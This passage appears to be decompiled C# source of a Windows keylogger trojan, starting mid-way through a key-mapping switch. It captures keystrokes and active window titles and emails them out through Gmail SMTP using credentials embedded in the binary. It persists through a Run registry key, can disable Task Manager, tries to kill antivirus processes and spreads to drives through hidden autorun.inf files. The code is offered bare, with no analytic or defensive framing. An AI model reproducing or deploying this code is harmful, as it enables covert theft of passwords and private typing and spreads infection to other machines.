            this.TextBox1.Text += "@";
            break;
          case Keys.D3:
            this.TextBox1.Text += "#";
            break;
          case Keys.D4:
            this.TextBox1.Text += "$";
            break;
          case Keys.D5:
            this.TextBox1.Text += "%";
            break;
          case Keys.D6:
            this.TextBox1.Text += "^";
            break;
          case Keys.D7:
            this.TextBox1.Text += "&";
            break;
          case Keys.D8:
            this.TextBox1.Text += "*";
            break;
          case Keys.D9:
            this.TextBox1.Text += "(";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ":";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += "<";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "_";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ">";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "?";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "~";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "{";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "|";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "}";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      new SmtpClient("smtp.gmail.com")
      {
        Port = 587,
        EnableSsl = true,
        Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text))
      }.Send(new MailMessage()
      {
        Subject = MyProject.Computer.Name + ":",
        To = {
          this.TextBox2.Text
        },
        From = new MailAddress(this.TextBox2.Text),
        Body = this.TextBox1.Text
      });
      this.TextBox1.Clear();
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) == 0)
        return;
      this.TextBox1.Text = this.TextBox1.Text + "\r\n[" + this.GetActiveWindowTitle() + "]:\r\n";
      this.strin = this.GetActiveWindowTitle();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      Microsoft.VisualBasic.FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.text1 = Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
      this.text2 = Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
      this.strax1 = Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
      this.strax2 = Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
      this.strax3 = Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
      Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text1);
      Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.text2);
      Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.strax1);
      Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.strax2);
      Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.strax3);
      Microsoft.VisualBasic.FileSystem.FileClose(1);
      this.options = Strings.Split(this.text1, "@StRaXxXD@");
      this.TextBox2.Text = this.options[1];
      this.TextBox3.Text = this.options[2];
      if (Conversions.ToBoolean(this.options[3]))
      {
        string fileName = Path.GetFileName(Application.ExecutablePath);
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\\" + fileName, true);
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue(fileName, (object) "C:\\");
        registryKey.Close();
        if (Conversions.ToBoolean(this.options[5]))
          MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System ", "DisableTaskMgr", (object) "1");
        if (Conversions.ToBoolean(this.options[4]))
        {
label_4:
          object objectValue1;
          object objectValue2;
          object LoopForResult;
          do
          {
            objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WMPlayer.OCX.7")), (System.Type) null, "cdromCollection", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          }
          while (!Operators.ConditionalCompareObjectGreaterEqual(NewLateBinding.LateGet(objectValue1, (System.Type) null, "Count", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 1, false) || !ObjectFlowControl.ForLoopControl.ForLoopInitObj(objectValue2, (object) 0, Operators.SubtractObject(NewLateBinding.LateGet(objectValue1, (System.Type) null, "Count", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 1), (object) 1, ref LoopForResult, ref objectValue2));
          do
          {
            object Instance1 = objectValue1;
            object[] objArray = new object[1]
            {
              RuntimeHelpers.GetObjectValue(objectValue2)
            };
            object[] Arguments1 = objArray;
            bool[] flagArray = new bool[1]{ true };
            bool[] CopyBack = flagArray;
            object Instance2 = NewLateBinding.LateGet(Instance1, (System.Type) null, "Item", Arguments1, (string[]) null, (System.Type[]) null, CopyBack);
            if (flagArray[0])
              objectValue2 = RuntimeHelpers.GetObjectValue(objArray[0]);
            object[] Arguments2 = new object[0];
            NewLateBinding.LateCall(Instance2, (System.Type) null, "Eject", Arguments2, (string[]) null, (System.Type[]) null, (bool[]) null, true);
          }
          while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(objectValue2, LoopForResult, ref objectValue2));
          goto label_4;
        }
      }
      this.Timer1.Start();
      this.Timer2.Start();
      this.Timer4.Start();
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      int num = 1;
      do
      {
        this.result = 0;
        this.result = Form1.GetAsyncKeyState((long) num);
        if (this.result == -32767)
          this.TextBox1.Text += Conversions.ToString(Strings.Chr(num));
        checked { ++num; }
      }
      while (num <= (int) byte.MaxValue);
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("sample"), false) == 0)
        {
          processes[index].Kill();
          if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("outpost"), false) == 0)
          {
            processes[index].Kill();
            if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("npfmsg"), false) == 0)
            {
              processes[index].Kill();
              if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("bdagent"), false) == 0)
              {
                processes[index].Kill();
                if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("kavsvc"), false) == 0)
                {
                  processes[index].Kill();
                  if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("egui"), false) == 0)
                  {
                    processes[index].Kill();
                    if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("zlclient"), false) == 0)
                      processes[index].Kill();
                  }
                }
              }
            }
          }
        }
        checked { ++index; }
      }
    }

    public void USBInfect()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
label_2:
        num3 = 3;
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
label_3:
        num3 = 4;
        string[] logicalDrives = Directory.GetLogicalDrives();
label_4:
        num3 = 5;
        string[] strArray = logicalDrives;
        int index = 0;
        goto label_14;
label_6:
        num3 = 6;
        string str;
        if (programFiles.Contains(str))
          goto label_12;
label_7:
        num3 = 8;
label_8:
        num3 = 9;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str + "HDDFile.com", (UIOption) -1, UICancelOption.DoNothing);
label_9:
        num3 = 10;
        MyProject.Computer.FileSystem.WriteAllText(str + "autorun.inf", "[autorun]\r\nopen=" + str + "HDDFile.com\r\nshellexecute=" + str, true);
label_10:
        num3 = 11;
        Microsoft.VisualBasic.FileSystem.SetAttr(str + "HDDFile.com", FileAttribute.Hidden);
label_11:
        num3 = 12;
        Microsoft.VisualBasic.FileSystem.SetAttr(str + "autorun.inf", FileAttribute.Hidden);
label_12:
        checked { ++index; }
label_13:
        num3 = 14;
label_14:
        if (index < strArray.Length)
        {
          str = strArray[index];
          goto label_6;
        }
        else
          goto label_21;
label_16:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_6;
              case 7:
              case 13:
                goto label_12;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 14:
                goto label_13;
              case 15:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public class KeyboardHook
    {
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Form1.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Form1.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Form1.KeyboardHook.KeyDownEventHandler KeyDown;

      public static event Form1.KeyboardHook.KeyUpEventHandler KeyUp;

      public KeyboardHook()
      {
        Form1.KeyboardHook.KeyHookDelegate = new Form1.KeyboardHook.KeyboardProcDelegate(Form1.KeyboardHook.KeyboardProc);
        Form1.KeyboardHook.KeyHook = Form1.KeyboardHook.SetWindowsHookEx(13, Form1.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              Form1.KeyboardHook.KeyDownEventHandler keyDownEvent = Form1.KeyboardHook.KeyDownEvent;
              if (keyDownEvent != null)
              {
                keyDownEvent((Keys) lParam.vkCode);
                break;
              }
              break;
            case 257:
            case 261:
              Form1.KeyboardHook.KeyUpEventHandler keyUpEvent = Form1.KeyboardHook.KeyUpEvent;
              if (keyUpEvent != null)
              {
                keyUpEvent((Keys) lParam.vkCode);
                break;
              }
              break;
          }
        }
        return Form1.KeyboardHook.CallNextHookEx(Form1.KeyboardHook.KeyHook, nCode, wParam, lParam);
      }

      ~KeyboardHook()
      {
        Form1.KeyboardHook.UnhookWindowsHookEx(Form1.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      public delegate void KeyDownEventHandler(Keys Key);

      public delegate void KeyUpEventHandler(Keys Key);
    }
  }
}
